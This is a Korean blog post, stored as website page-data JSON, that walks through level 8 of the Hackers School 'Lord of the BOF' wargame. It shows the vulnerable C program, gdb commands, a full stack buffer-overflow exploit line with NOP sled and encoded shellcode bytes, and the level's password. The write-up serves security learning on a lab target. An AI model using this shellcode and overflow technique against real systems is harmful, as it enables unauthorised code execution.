{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221018/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. 들어가기 전에</h3>\n<p>이 문제에서는 더 이상 매개변수를 두개 넘겨줄 수 없다. 해결법은 그래도 그리 어렵진 않다.</p>\n<h3>Level 8 : Orge -> Troll</h3>\n<p>소스코드를 확인해보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">#include &lt;stdio.h>\r\n#include &lt;stdlib.h>\r\n\r\nextern char **environ;\r\n\r\nmain(int argc, char *argv[])\r\n{\r\n        char buffer[40];\r\n        int i;\r\n\r\n        // here is changed, 파라미터의 개수가 하나밖에 없다.\r\n        if(argc != 2){\r\n                printf(\"argc must be two!\\n\");\r\n                exit(0);\r\n        }\r\n\r\n        // egghunter, 환경변수 사용 불가\r\n        for(i=0; environ[i]; i++)\r\n                memset(environ[i], 0, strlen(environ[i]));\r\n\r\n        // 첫 번째 argv의 마지막 값은 무조건 /xbf, 따라서 특정 주소를 나타내야 한다.\r\n        if(argv[1][47] != '\\xbf')\r\n        {\r\n                printf(\"stack is still your friend.\\n\");\r\n                exit(0);\r\n        }\r\n\r\n        // check the length of argument\r\n        if(strlen(argv[1]) > 48){\r\n                printf(\"argument is too long!\\n\");\r\n                exit(0);\r\n        }\r\n\r\n        strcpy(buffer, argv[1]);\r\n        printf(\"%s\\n\", buffer);\r\n\r\n        // buffer hunter\r\n        memset(buffer, 0, 40);\r\n\r\n        // one more!\r\n        memset(argv[1], 0, strlen(argv[1]));\r\n}</code></pre></div>\n<p>이런 경우는 그냥 첫 번째 매개변수에 두 번째 매개변수를 넘겨주면 되는데, 이게 무슨 말이냐면 :</p>\n<blockquote>\n<blockquote>\n<p>우리가 넘길 매개변수 = return주소를 포함하는 통상적인 버퍼 오버플로우 스트링 + ” ” (빈 스트링) + NOP SLED 포함 쉘코드</p>\n</blockquote>\n</blockquote>\n<p>이런 식으로 매개변수를 넘겨서, return 주소가 NOP SLED 어딘가쯤에 오게 만들면 된다는 말이다. 말로 들으면 어려우니 코드를 보자 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">b * main\r\nr `python -c'print \"A\"*44+\"\\xbf\\xbf\\xbf\\xbf\"'` `python -c'print \"\\x90\"*100'`\r\nx/200x $esp</code></pre></div>\n<p>확인해보면 A(\\x41)부터 시작해서 쭉쭉 나가다가 어느 순간 \\x90이 시작되는 것이 보인다. 그 주소는 다음과 같다 :</p>\n<p>대충이나마의 주소 : 0xbffffb3c</p>\n<p>그럼 그냥 return 코드로 저 주소를 넘겨주면 된다. 어렵지 않다.</p>\n<p>따라서 exploit :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">./`python -c 'print \"\\x90\"*20+\"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x32\\x80\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\\x32\\xc1\\x51\\x69\\x30\\x30\\x74\\x69\\x69\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\x51\\x54\\x8a\\xe2\\x9a\\xb1\\x0c\\xce\\x81\"+\" \"+\"D\"*44+\"\\x90\\xfb\\xff\\xbf\"'`</code></pre></div>\n<p>비밀번호 : aspirin</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"FTZ LOB LEVEL 8","summary":"","date":"2022.10.18.","before":"2022.10.17.","after":"2022.10.19.","categories":["C-SEC","KOR","PWN"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVVkeVbX188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwERBBMSACExkdL/2gAIAQMBAT8B2ilGRqfkmnJaO5BG2Fm7EEBS+Rl5DcJ1Lio5UF8u9RLSvwPufnr/xAAeEQACAgICAwAAAAAAAAAAAAACAwEEEiEAEyIx0f/aAAgBAgEBPwGsMuOvJoqKdUSa02ASruFNphvYnsFMEQTYJzZgvHNpzjM7LvZGsla16P5z/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIDBBIABRETISIxQRQVIzKSoeH/2gAIAQEABj8Cr8omzfNjSx0cVDkTQ1ctNLk8805aGopgwe2jCPUeqprZBLtoiABi49xzLNBmMiyVFOlaqho6iOCd13t5eH3VtdLF05PQCcctz56Tx+sEaq61NHJQkSC/bjHzI8Wv1lR06X72ySL2Y42nGqqblFzWp5NijQKWJBJHkdscKfy/mP/EAB0QAQADAAIDAQAAAAAAAAAAAAEAESFBUTFhcYH/2gAIAQEAAT8hzE24tLQPVhJNJSUr0wCVxU0kcX1weVyNLTnpyNwLOBO6TwpZRaBNbsWfuEhKrYwKf3z+J//aAAwDAQACAAMAAAAQkN//xAAaEQEAAgMBAAAAAAAAAAAAAAABETEAIaFh/9oACAEDAQE/EEyD5/zMnaTFJWUhNy32jxPPc//EABoRAQACAwEAAAAAAAAAAAAAAAERMQAhQZH/2gAIAQIBAT8QEX6POL11GhsyL86M8GpYB4FVWf/EABgQAQEBAQEAAAAAAAAAAAAAAAERIQAx/9oACAEBAAE/EJoUOgd33xFiGjvwLQjW8KY0zoweyIVAKQD6LTn7qVBNlE8EIiuUSHK55IjERS7B4w67dNSnsqKzV7//2Q=="},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221018/"}},"staticQueryHashes":[],"slicesMap":{}}